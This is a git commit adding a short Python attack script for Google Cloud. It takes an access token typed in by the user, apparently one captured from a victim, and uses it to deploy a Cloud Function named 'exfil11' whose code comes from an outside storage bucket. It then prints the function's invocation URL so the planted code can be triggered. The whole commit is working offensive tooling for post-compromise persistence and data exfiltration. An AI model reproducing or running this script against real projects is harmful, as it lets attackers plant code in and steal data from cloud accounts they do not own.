31ece9767c85a91b2becb24659da049b25c7f0c1
Anirban Das <63131674+anrbn@users.noreply.github.com>
2023-03-17 21:19:53 +0530

    Add files via upload

---
+++ code/grpc-deploy-storage.py
@@ -0,0 +1,43 @@
+from google.cloud.functions_v1 import CloudFunctionsServiceClient, CloudFunction, CreateFunctionRequest
+import google.oauth2.credentials
+
+#------change this--------
+location = "us-east1"
+function_name = "exfil11"
+gsutil_uri = "gs://anirb/function.zip"
+function_entry_point = "exfil"
+project_id="nnnn-374620"
+#-------------------------
+
+access_token = input('Enter Access Token: ')
+credentials = google.oauth2.credentials.Credentials(access_token)
+client = CloudFunctionsServiceClient(credentials=credentials)
+
+url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, function_name)
+
+function = CloudFunction(
+    name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
+    source_archive_url="{}".format(gsutil_uri),
+    entry_point=function_entry_point,
+    runtime="python38",
+    https_trigger={},
+)
+
+request = CreateFunctionRequest(location="projects/{}/locations/{}".format(project_id, location), function=function)
+
+try:
+    response = client.create_function(request=request)
+    result = response.result()
+    print(f"[+] Function Invocation URL: {url}")
+    print("[+] Cloud Function creation has started")
+    print("[+] Takes 1-2 minutes to create")
+
+except Exception as e:
+    if "cloudfunctions.operations.get" in str(e):
+        print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
+        print(f"[+] Function Invocation URL: {url}")
+        print("[+] Cloud Function creation has started")
+        print("[+] Takes 1-2 minutes to create")
+        
+    else:
+        print(f"[!] Error: {str(e)}")
